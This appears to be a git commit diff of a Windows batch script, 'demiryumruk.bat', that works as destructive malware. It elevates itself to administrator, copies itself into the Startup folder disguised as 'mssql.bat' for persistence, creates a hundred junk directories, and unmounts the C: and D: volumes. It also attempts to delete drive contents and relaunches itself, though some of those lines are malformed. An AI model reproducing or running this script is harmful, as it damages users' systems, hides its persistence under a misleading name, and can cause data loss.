9c603403a612d046028143cd5f03dc3f562785f0
satrancistanbul <97613229+satrancistanbul@users.noreply.github.com>
2023-04-05 19:23:46 +0300

    Add files via upload
    demiryumruk 5.0

--- demiryumruk.bat
+++ demiryumruk.bat
@@ -1,11 +1,113 @@
 @echo off
 if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\demiryumruk.bat"
-copy "%ALLUSERSPROFILE%\Desktop\demiryumruk.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
+copy demiryumruk.bat "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mssql.bat"
+md URMOM
+md URMOM0
+md URMOM1
+md URMOM2
+md URMOM3
+md URMOM4
+md URMOM5
+md URMOM6
+md URMOM7
+md URMOM8
+md URMOM9
+md URMOM10
+md URMOM11
+md URMOM12
+md URMOM13
+md URMOM14
+md URMOM15
+md URMOM16
+md URMOM17
+md URMOM18
+md URMOM19
+md URMOM20
+md URMOM21
+md URMOM22
+md URMOM23
+md URMOM24
+md URMOM25
+md URMOM26
+md URMOM27
+md URMOM28
+md URMOM29
+md URMOM30
+md URMOM31
+md URMOM32
+md URMOM33
+md URMOM34
+md URMOM35
+md URMOM36
+md URMOM37
+md URMOM38
+md URMOM39
+md URMOM40
+md URMOM41
+md URMOM42
+md URMOM43
+md URMOM44
+md URMOM45
+md URMOM46
+md URMOM47
+md URMOM48
+md URMOM49
+md URMOM50
+md URMOM51
+md URMOM52
+md URMOM53
+md URMOM54
+md URMOM55
+md URMOM56
+md URMOM57
+md URMOM58
+md URMOM59
+md URMOM60
+md URMOM61
+md URMOM62
+md URMOM63
+md URMOM64
+md URMOM65
+md URMOM66
+md URMOM67
+md URMOM68
+md URMOM69
+md URMOM70
+md URMOM71
+md URMOM72
+md URMOM73
+md URMOM74
+md URMOM75
+md URMOM76
+md URMOM77
+md URMOM78
+md URMOM79
+md URMOM80
+md URMOM81
+md URMOM82
+md URMOM83
+md URMOM84
+md URMOM85
+md URMOM86
+md URMOM87
+md URMOM88
+md URMOM89
+md URMOM90
+md URMOM91
+md URMOM92
+md URMOM93
+md URMOM94
+md URMOM95
+md URMOM96
+md URMOM97
+md URMOM98
+md URMOM99
+md URMOM100
 mountvol c: /d
 mountvol d: /d
-del c:
-del d:
+PS C:\> echo y del c:
+PS C:\> echo y del d:
 start demiryumruk.bat
 pause
 
